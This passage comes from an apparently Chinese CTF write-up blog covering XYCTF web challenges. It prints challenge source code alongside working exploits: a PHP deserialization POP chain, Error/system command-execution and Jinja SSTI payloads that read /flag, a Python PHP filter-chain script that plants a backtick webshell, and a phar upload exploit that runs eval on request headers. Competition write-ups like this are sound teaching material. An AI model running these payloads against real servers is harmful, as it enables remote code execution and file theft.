class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypto0</span>, <span class="variable">$adwa</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="variable">$crypto0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XYCTF</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="string">&#x27;dev1l&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="string">&#x27;yuroandCMD258&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$KickyMu</span>, <span class="variable">$fpclose</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="variable">$KickyMu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fpclose = <span class="variable">$fpclose</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XY</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;N1ght == <span class="string">&#x27;oSthing&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;WOW, You web is really good!!!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;Y&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;KickyMu-&gt;<span class="title function_ invoke__">XYCTF</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">XY</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;T1ng = <span class="string">&#x27;yuroandCMD258&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;oSthing&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$zhou</span>=<span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>();</span><br><span class="line"><span class="variable">$zhou</span>-&gt;KickyMu=<span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line"><span class="variable">$zhou</span>-&gt;KickyMu-&gt;adwa=<span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>();</span><br><span class="line"><span class="variable">$zhou</span>-&gt;KickyMu-&gt;adwa-&gt;crypto0=<span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$zhou</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X=SplFileObject&amp;Y=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=SplFileObject&amp;aa=/flag&amp;c=__tostring</span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/splfileinfo.tostring.php">https://www.php.net/manual/zh/splfileinfo.tostring.php</a></p>
<p><strong>示例 #1 *<em>SplFileInfo::__toString()*</em> example</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>-&gt;<span class="title function_ invoke__">__toString</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$info</span>.PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="string">&#x27;/usr/bin/php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>-&gt;<span class="title function_ invoke__">__toString</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$info</span>.PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上示例的输出类似于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string(3) &quot;foo&quot;</span><br><span class="line">foo</span><br><span class="line">string(12) &quot;/usr/bin/php&quot;</span><br><span class="line">/usr/bin/php</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?a=Error&amp;aa=system&amp;c=getMessage&amp;b=Error&amp;bb=ls</span><br></pre></td></tr></table></figure>

<p>等同于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">((new Error(&#x27;system&#x27;))-&gt;getMessage())((new $Error(&#x27;ls&#x27;))-&gt;getMessage());</span><br></pre></td></tr></table></figure>



<h1 id="我是一个复读机器"><a href="#我是一个复读机器" class="headerlink" title="我是一个复读机器"></a>我是一个复读机器</h1><p>发现它把中文换成了花括号 并且过滤了下划线</p>
<p>方法一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sentence=lipsum|attr(request.args.glo)|attr(request.args.ge)(request.args.o)|attr(request.args.po)(request.args.cmd)|attr(request.args.re)()呵呵&amp;glo=__globals__&amp;ge=__getitem__&amp;o=os&amp;po=popen&amp;cmd=cat /flag&amp;re=read</span><br></pre></td></tr></table></figure>

<h1 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h1><p>下载源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include_once</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p> 类似于连连看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#参数file</span><br><span class="line">url = &quot;http://localhost:51650/index.php&quot;</span><br><span class="line">file_to_use = &quot;/etc/passwd&quot;</span><br><span class="line">command = &quot;/readflag&quot; #正常做题的话应该先是ls根目录发现有readflag文件并且flag无法直接通过cat读取，再用/readflag</span><br><span class="line"></span><br><span class="line">#&lt;?=`$_GET[0]`;;?&gt;</span><br><span class="line">base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    &#x27;R&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;,</span><br><span class="line">    &#x27;B&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;,</span><br><span class="line">    &#x27;C&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;,</span><br><span class="line">    &#x27;8&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;,</span><br><span class="line">    &#x27;9&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;,</span><br><span class="line">    &#x27;f&#x27;: &#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;,</span><br><span class="line">    &#x27;s&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;,</span><br><span class="line">    &#x27;z&#x27;: &#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;,</span><br><span class="line">    &#x27;U&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;,</span><br><span class="line">    &#x27;P&#x27;: &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;,</span><br><span class="line">    &#x27;V&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;,</span><br><span class="line">    &#x27;0&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;,</span><br><span class="line">    &#x27;Y&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;,</span><br><span class="line">    &#x27;W&#x27;: &#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;,</span><br><span class="line">    &#x27;d&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;,</span><br><span class="line">    &#x27;D&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;,</span><br><span class="line">    &#x27;7&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;,</span><br><span class="line">    &#x27;4&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># generate some garbage base64</span><br><span class="line">filters = &quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br><span class="line">filters += &quot;convert.base64-encode|&quot;</span><br><span class="line"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class="line">filters += &quot;convert.iconv.UTF8.UTF7|&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for c in base64_payload[::-1]:</span><br><span class="line">        filters += conversions[c] + &quot;|&quot;</span><br><span class="line">        # decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br><span class="line">        filters += &quot;convert.base64-decode|&quot;</span><br><span class="line">        filters += &quot;convert.base64-encode|&quot;</span><br><span class="line">        # get rid of equal signs</span><br><span class="line">        filters += &quot;convert.iconv.UTF8.UTF7|&quot;</span><br><span class="line"></span><br><span class="line">filters += &quot;convert.base64-decode&quot;</span><br><span class="line"></span><br><span class="line">final_payload = f&quot;php://filter/&#123;filters&#125;/resource=&#123;file_to_use&#125;&quot;</span><br><span class="line">print(final_payload)</span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    &quot;0&quot;: command,</span><br><span class="line">    #&quot;action&quot;: &quot;include&quot;,</span><br><span class="line">    &quot;file&quot;: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>



<h1 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^phar:\/\//i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>只能用有字母和括号</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);  </span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd=<span class="string">&#x27;print_r(getallheaders());eval(reset(getallheaders()));__halt_compiler();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>修改Content-Type 为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure>

<p>文件上传存在典型检测<code>__HALT_COMPILER被过滤了</code> 将生成的Phar文件进行gzip压缩绕过即可<br>gzip压缩后，修改后缀为jpg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filtr/resource=phar:///tmp/364be8860e8d72b4358b5e88099a935a.png</span><br></pre></td></tr></table></figure>

<h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><p>存在pick 反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://gz.imxbt.cn:20846//register.php</span><br></pre></td></tr></table></figure>





]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
</search>
